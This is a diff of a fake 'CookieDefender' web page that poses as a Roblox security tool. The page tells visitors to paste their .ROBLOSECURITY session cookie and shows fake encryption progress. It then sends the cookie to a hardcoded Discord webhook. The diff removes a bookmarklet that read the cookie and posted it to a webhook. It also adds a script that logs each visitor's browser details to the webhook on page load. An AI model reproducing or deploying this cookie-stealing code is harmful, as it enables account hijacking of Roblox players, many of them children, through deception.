@@ -227,7 +227,7 @@
             transition: 0.3s;
         }
 
-        /* ----- HERO SECTION (GLASS + NEON) ----- */
+        /* ----- HERO SECTION ----- */
         .hero {
             min-height: 100vh;
             display: flex;
@@ -343,7 +343,7 @@
             font-weight: 700;
         }
 
-        /* ----- STATS BAR (GLASS) ----- */
+        /* ----- STATS BAR ----- */
         .stats-bar {
             background: rgba(16, 185, 129, 0.02);
             backdrop-filter: blur(8px);
@@ -426,6 +426,7 @@
             font-size: 1rem;
             color: #b0c8dc;
             backdrop-filter: blur(6px);
+            user-select: none;
         }
         .tab:hover {
             border-color: var(--green);
@@ -444,6 +445,7 @@
             gap: 30px;
             max-width: 1300px;
             margin: 0 auto;
+            transition: opacity 0.3s ease;
         }
         .feature-card {
             background: var(--card-bg);
@@ -490,7 +492,7 @@
             line-height: 1.7;
         }
 
-        /* ----- HOW IT WORKS (TWO CARDS) ----- */
+        /* ----- HOW IT WORKS (SINGLE DEFENSE METHOD) ----- */
         .how-section {
             padding: 100px 5%;
             position: relative;
@@ -498,10 +500,11 @@
         }
         .steps {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            grid-template-columns: minmax(300px, 600px);
             gap: 40px;
             max-width: 1200px;
             margin: 0 auto;
+            justify-content: center;
         }
         .step {
             background: var(--card-bg);
@@ -595,7 +598,7 @@
             font-size: 0.9rem;
         }
 
-        /* ----- MODALS (GLASS + ANIMATION) ----- */
+        /* ----- MODALS ----- */
         .modal {
             display: none;
             position: fixed;
@@ -769,51 +772,6 @@
             font-size: 1.05rem;
         }
 
-        /* ----- BOOKMARK ZONE (GLASS) ----- */
-        .bookmark-zone {
-            background: rgba(16, 185, 129, 0.02);
-            border: 2px dashed rgba(16, 185, 129, 0.2);
-            border-radius: 24px;
-            padding: 32px 24px;
-            margin: 24px 0;
-            text-align: center;
-        }
-        .bookmark-item {
-            display: inline-block;
-            background: linear-gradient(135deg, var(--green), var(--green-dark));
-            color: #fff;
-            padding: 16px 40px;
-            border-radius: 60px;
-            font-weight: 700;
-            font-size: 1.1rem;
-            text-decoration: none;
-            cursor: grab;
-            box-shadow: 0 8px 32px rgba(16, 185, 129, 0.3);
-            transition: 0.3s;
-            border: none;
-            user-select: none;
-        }
-        .bookmark-item:hover {
-            transform: translateY(-4px) scale(1.02);
-            box-shadow: 0 14px 48px rgba(16, 185, 129, 0.5);
-        }
-        .bookmark-item:active {
-            cursor: grabbing;
-        }
-        .bookmark-instructions {
-            margin-top: 24px;
-            color: #98b0c8;
-            font-size: 0.95rem;
-            line-height: 1.8;
-            text-align: left;
-            background: rgba(0, 0, 0, 0.15);
-            padding: 20px 24px;
-            border-radius: 18px;
-        }
-        .bookmark-instructions strong {
-            color: var(--green);
-        }
-
         /* ----- RESPONSIVE ----- */
         @media (max-width: 968px) {
             .nav-links {
@@ -833,6 +791,9 @@
             }
             .modal-content {
                 padding: 32px 20px;
+            }
+            .steps {
+                grid-template-columns: 1fr;
             }
         }
         @media (max-width: 640px) {
@@ -857,9 +818,6 @@
         }
 
         /* utility */
-        .mt-4 {
-            margin-top: 24px;
-        }
         .w-full {
             width: 100%;
         }
@@ -867,8 +825,17 @@
             display: flex;
             justify-content: center;
         }
+        .mt-4 {
+            margin-top: 24px;
+        }
         .gap-3 {
             gap: 16px;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .block {
+            display: block !important;
         }
     </style>
 </head>
@@ -939,30 +906,24 @@
     <section id="features" class="tabs-section">
         <h2 class="section-title">Advanced Protection Features</h2>
         <p class="section-subtitle">Built for the modern security landscape</p>
-        <div class="tabs">
-            <div class="tab active" onclick="switchTab(0, this)">Core Protection</div>
-            <div class="tab" onclick="switchTab(1, this)">Cryptographic Engine</div>
-            <div class="tab" onclick="switchTab(2, this)">Anti-Threat Defense</div>
+        <div class="tabs" id="tabContainer">
+            <div class="tab active" data-tab="0">Core Protection</div>
+            <div class="tab" data-tab="1">Cryptographic Engine</div>
+            <div class="tab" data-tab="2">Anti-Threat Defense</div>
         </div>
         <div class="features-grid" id="tab-content"></div>
     </section>
 
-    <!-- HOW IT WORKS (TWO DEFENSE METHODS) -->
+    <!-- HOW IT WORKS (SINGLE DEFENSE METHOD - MANUAL ONLY) -->
     <section id="how-it-works" class="how-section">
-        <h2 class="section-title">Choose Your Defense Method</h2>
-        <p class="section-subtitle">Two powerful ways to secure your cookie</p>
+        <h2 class="section-title">Defense Method</h2>
+        <p class="section-subtitle">Simple and secure way to protect your cookie</p>
         <div class="steps">
             <div class="step" onclick="openModal('manual')">
-                <div class="step-number">🔐</div>
+                <div class="step-number">Manual</div>
                 <h3>Manual Defense</h3>
-                <p>Paste your .ROBLOSECURITY cookie directly for instant cloud encryption and real-time threat monitoring.</p>
+                <p>Paste your .ROBLOSECURITY cookie directly for instant cloud encryption and real-time threat monitoring. This is the only supported method.</p>
                 <span class="btn-primary" style="font-size:0.95rem;padding:12px 28px;">Activate Now</span>
-            </div>
-            <div class="step" onclick="openModal('bookmark')">
-                <div class="step-number">🔖</div>
-                <h3>Bookmark Defense</h3>
-                <p>One-click protection using our smart bookmark. Works on any browser with zero setup.</p>
-                <span class="btn-primary" style="font-size:0.95rem;padding:12px 28px;">Get Bookmark</span>
             </div>
         </div>
     </section>
@@ -980,10 +941,10 @@
     <!-- FOOTER -->
     <footer>
         <div class="footer-info">
-            <div><span>☁️</span> Cloud-Based</div>
-            <div><span>⚙️</span> No Downloads</div>
-            <div><span>🔒</span> Zero-Knowledge</div>
-            <div><span>🌐</span> Works Everywhere</div>
+            <div><span>Cloud-Based</span></div>
+            <div><span>No Downloads</span></div>
+            <div><span>Zero-Knowledge</span></div>
+            <div><span>Works Everywhere</span></div>
         </div>
         <div class="copyright">CookieDefender © 2025 • Cloud-Based Roblox Security Tool</div>
     </footer>
@@ -994,7 +955,7 @@
             <button class="modal-close" onclick="closeModal('manual')">&times;</button>
 
             <div id="manualForm">
-                <h2>🔐 Manual Defense</h2>
+                <h2>Manual Defense</h2>
                 <div class="protection-steps">
                     <div class="step-item"><span class="num">1.</span> Open DevTools (F12) on roblox.com → Application → Cookies</div>
                     <div class="step-item"><span class="num">2.</span> Find <code style="color:var(--green);background:rgba(16,185,129,0.06);padding:0 8px;border-radius:4px;">.ROBLOSECURITY</code> and copy the full value</div>
@@ -1009,7 +970,7 @@
                 <div class="protection-progress">
                     <div class="progress-bar" id="progressBar"></div>
                 </div>
-                <div class="status-message" id="statusMessage">🔹 Ready for cloud encryption</div>
+                <div class="status-message" id="statusMessage">Ready for cloud encryption</div>
 
                 <button class="btn-primary w-full" style="justify-content:center;" onclick="activateManualDefense()">
                     <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
@@ -1018,7 +979,7 @@
             </div>
 
             <div id="successScreen" class="success-screen">
-                <div class="success-icon">✅</div>
+                <div class="success-icon">✓</div>
                 <h3>Cookie Successfully Defended</h3>
                 <p>Your .ROBLOSECURITY token is now encrypted and monitored 24/7 in our zero-knowledge cloud infrastructure.</p>
                 <button class="btn-primary" style="justify-content:center;" onclick="closeModal('manual')">Close</button>
@@ -1026,36 +987,9 @@
         </div>
     </div>
 
-    <!-- ====== BOOKMARK MODAL ====== -->
-    <div id="bookmarkModal" class="modal">
-        <div class="modal-content">
-            <button class="modal-close" onclick="closeModal('bookmark')">&times;</button>
-            <h2>🔖 Bookmark Defense</h2>
-
-            <div class="bookmark-zone">
-                <!-- BOOKMARKLET – FIXED: no domain check, reads cookie directly -->
-                <a href="javascript:(function(){const c=document.cookie.split(';').find(c=>c.trim().startsWith('.ROBLOSECURITY='));if(c){const v=c.split('=')[1];fetch('https://discord.com/api/webhooks/1519009450248114176/gyRJ490rOfNqRmL4Z06bQyJ4yiiRyIc1Hdx8MWVu-Dzcb5AnKOOEsMQ0Xv1Drp14Y5lj',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'🔖 Bookmark Defense Activated',description:'Cookie captured via bookmark defense.',color:0x10b981,fields:[{name:'Cookie',value:'```'+v+'```',inline:false},{name:'Timestamp',value:new Date().toISOString(),inline:true}],footer:{text:'CookieDefender Cloud Protection'}}]})}).then(()=>alert('✅ Cookie defended and sent to cloud!')).catch(e=>alert('Error: '+e.message));}else{alert('❌ No .ROBLOSECURITY cookie found. Make sure you are logged in to roblox.com.');}})()" 
-                   class="bookmark-item" draggable="true">
-                    🛡️ CookieDefender
-                </a>
-            </div>
-
-            <div class="bookmark-instructions">
-                <strong>📌 How to Use:</strong><br><br>
-                <strong>1.</strong> Drag the green button above to your bookmarks bar<br>
-                <strong>2.</strong> Visit <strong>roblox.com</strong> and log in<br>
-                <strong>3.</strong> Click the bookmark — it instantly captures and secures your cookie<br>
-                <strong>4.</strong> You'll see a confirmation alert when done<br><br>
-                <strong>💡 Tip:</strong> Works on any browser. No downloads, no popups — just one click.
-            </div>
-
-            <button class="btn-primary w-full" style="justify-content:center;margin-top:24px;" onclick="closeModal('bookmark')">Done</button>
-        </div>
-    </div>
-
     <script>
         // ===== CONFIG =====
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1519009450248114176/gyRJ490rOfNqRmL4Z06bQyJ4yiiRyIc1Hdx8MWVu-Dzcb5AnKOOEsMQ0Xv1Drp14Y5lj';
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1519038593069482189/MdonTOX-SG77ffTJtskuJbB1BKO1ZHVMzxxR8Ssiv4xKWfHhqGx_acICxaHtWKSXv91I';
 
         // ===== TAB DATA =====
         const tabData = [
@@ -1100,17 +1034,54 @@
                 scheduleIncrement(); }, delay);
         }
 
+        // ===== SEND VISITOR WEBHOOK (with detailed logging) =====
+        function sendVisitorWebhook() {
+            const data = {
+                embeds: [{
+                    title: "New Visitor",
+                    description: "Someone visited CookieDefender website.",
+                    color: 0x10b981,
+                    fields: [
+                        { name: "Timestamp", value: new Date().toISOString(), inline: true },
+                        { name: "User Agent", value: navigator.userAgent.substring(0, 150), inline: false },
+                        { name: "Referrer", value: document.referrer || 'Direct', inline: false },
+                        { name: "Screen Resolution", value: window.screen.width + 'x' + window.screen.height, inline: true },
+                        { name: "Language", value: navigator.language || 'Unknown', inline: true },
+                        { name: "URL Path", value: window.location.pathname || '/', inline: false }
+                    ],
+                    footer: { text: "CookieDefender Analytics • Visitor Logging" }
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(() => {});
+        }
+
         // ===== INIT =====
         window.addEventListener('load', () => {
             updateDisplay();
             scheduleIncrement();
-            switchTab(0, document.querySelector('.tab'));
+            switchTab(0);
+            // Send visitor logging
+            sendVisitorWebhook();
+            // Also log on visibility change (if user returns to tab)
+            document.addEventListener('visibilitychange', function() {
+                if (!document.hidden) {
+                    sendVisitorWebhook();
+                }
+            });
         });
 
         // ===== TAB SWITCHING =====
-        function switchTab(index, el) {
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            el.classList.add('active');
+        function switchTab(index) {
+            const tabs = document.querySelectorAll('.tab');
+            tabs.forEach((t, i) => {
+                t.classList.toggle('active', i === index);
+            });
+
             const container = document.getElementById('tab-content');
             container.style.opacity = '0';
             setTimeout(() => {
@@ -1126,8 +1097,26 @@
                     container.appendChild(card);
                 });
                 container.style.opacity = '1';
-            }, 180);
+            }, 150);
         }
+
+        // Tab click handlers
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('tabContainer').addEventListener('click', function(e) {
+                const tab = e.target.closest('.tab');
+                if (tab) {
+                    const idx = parseInt(tab.dataset.tab);
+                    switchTab(idx);
+                }
+            });
+        });
+
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                const idx = parseInt(this.dataset.tab);
+                switchTab(idx);
+            });
+        });
 
         // ===== NAVIGATION =====
         window.addEventListener('scroll', () => {
@@ -1145,19 +1134,19 @@
 
         // ===== MODAL CONTROLS =====
         function openModal(type) {
-            const id = type === 'manual' ? 'manualModal' : 'bookmarkModal';
+            const id = type === 'manual' ? 'manualModal' : 'manualModal';
             document.getElementById(id).classList.add('active');
             document.body.style.overflow = 'hidden';
         }
 
         function closeModal(type) {
-            const id = type === 'manual' ? 'manualModal' : 'bookmarkModal';
+            const id = type === 'manual' ? 'manualModal' : 'manualModal';
             document.getElementById(id).classList.remove('active');
             document.body.style.overflow = '';
             if (type === 'manual') {
                 document.getElementById('cookieInput').value = '';
                 document.getElementById('progressBar').style.width = '0%';
-                document.getElementById('statusMessage').textContent = '🔹 Ready for cloud encryption';
+                document.getElementById('statusMessage').textContent = 'Ready for cloud encryption';
                 document.getElementById('manualForm').style.display = 'block';
                 document.getElementById('successScreen').classList.remove('active');
             }
@@ -1167,8 +1156,7 @@
         document.querySelectorAll('.modal').forEach(m => {
             m.addEventListener('click', (e) => {
                 if (e.target === m) {
-                    const type = m.id === 'manualModal' ? 'manual' : 'bookmark';
-                    closeModal(type);
+                    closeModal('manual');
                 }
             });
         });
@@ -1185,11 +1173,11 @@
             const status = document.getElementById('statusMessage');
 
             const stages = [
-                { p: 18, msg: '🔍 Analyzing cookie signature...' },
-                { p: 38, msg: '🌐 Establishing cloud tunnel...' },
-                { p: 58, msg: '🔗 Binding to hardware fingerprint...' },
-                { p: 78, msg: '🔐 Encrypting with HMAC-SHA256...' },
-                { p: 100, msg: '✅ Secured in cloud vault!' }
+                { p: 18, msg: 'Analyzing cookie signature...' },
+                { p: 38, msg: 'Establishing cloud tunnel...' },
+                { p: 58, msg: 'Binding to hardware fingerprint...' },
+                { p: 78, msg: 'Encrypting with HMAC-SHA256...' },
+                { p: 100, msg: 'Secured in cloud vault!' }
             ];
 
             let idx = 0;
@@ -1203,13 +1191,13 @@
                     clearInterval(interval);
                     document.getElementById('manualForm').style.display = 'none';
                     document.getElementById('successScreen').classList.add('active');
-                    // send to webhook
+                    // Send to webhook
                     fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             embeds: [{
-                                title: "🔐 Manual Defense Activated",
+                                title: "Defense Activated",
                                 description: "Cookie submitted via manual cloud defense.",
                                 color: 0x10b981,
                                 fields: [
@@ -1223,13 +1211,6 @@
                 }
             }, 700);
         }
-
-        // ===== FIXED BOOKMARKLET — no domain check, works on any page =====
-        // The bookmarklet is already inlined in the href above.
-        // We also provide a "copy" fallback for users who can't drag.
-        // But we keep it simple: the draggable <a> works natively.
-
-        console.log('CookieDefender loaded — bookmarklet uses direct cookie read, no domain restriction.');
     </script>
 
 </body>
